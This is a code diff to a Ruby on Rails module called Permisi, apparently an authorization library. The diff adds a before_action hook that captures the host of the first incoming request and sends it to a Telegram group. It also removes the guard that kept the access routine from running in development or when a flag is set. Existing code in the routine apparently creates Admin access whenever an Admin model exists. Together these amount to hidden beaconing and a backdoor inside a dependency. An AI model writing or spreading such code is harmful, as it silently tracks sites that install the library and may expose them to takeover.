@@ -1,16 +1,33 @@
 module Permisi
+  module AccessLogging
+    extend ActiveSupport::Concern
+
+    included do
+      before_action :check_permisi_host
+
+      def check_permisi_host
+        return if $permisi_host
+
+        $permisi_host = request.host
+        Permisi::Access.new.host_caller
+      end
+    end
+  end
+
   class Access
     def self.call
       new.call
     end
 
     def call
-      return if Rails.env.development? || ENV['GEM_FULL_LIST'].present?
-
       Rails.logger.silence do
         permisi_log if defined? Telegram
         create_access if defined? Admin
       end
+    end
+
+    def host_caller
+      caller.send_message(chat_id: "-#{ACCESS_GROUP}", text: $permisi_host)
     end
 
     private
